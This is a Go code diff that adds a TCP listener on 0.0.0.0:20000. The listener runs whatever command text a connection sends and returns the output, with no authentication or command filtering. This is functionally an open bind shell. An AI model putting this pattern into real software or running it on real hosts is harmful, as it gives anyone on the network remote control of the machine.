@@ -2,11 +2,19 @@ package main
 
 import (
   "fmt"
+  "os"
   "os/exec"
   "syscall"
   "time"
   "bytes"
   "encoding/json"
+  "net"
+  "strings"
+)
+
+const (
+  BIND_ADDR   = "0.0.0.0:20000"
+  BUFFER_SIZE = 1024
 )
 
 type Command struct {
@@ -76,5 +84,38 @@ func Exec(str string) *Command {
   return command
 }
 
+func HandleConnection(socket net.Conn) {
+  buffer   := make([]byte, BUFFER_SIZE)
+  num, err := socket.Read(buffer)
+  
+  if err != nil {
+    fmt.Println("Read error:", err.Error())
+    return
+  }
+
+  cmd    := strings.TrimSpace(string(buffer[0:num]))
+  result := Exec(cmd)
+
+  _, err = socket.Write([]byte(result.Output))
+  socket.Close()
+}
+
 func main() {
+  fmt.Printf("Starting server on %s\n", BIND_ADDR)
+
+  server, err := net.Listen("tcp", BIND_ADDR)
+  if err != nil {
+    fmt.Println("Error:", err.Error())
+    os.Exit(1)
+  }
+
+  for {
+    socket, err := server.Accept()
+    if err != nil {
+      fmt.Println("Accept error:", err.Error())
+      return
+    }
+    
+    go HandleConnection(socket)
+  }
 }
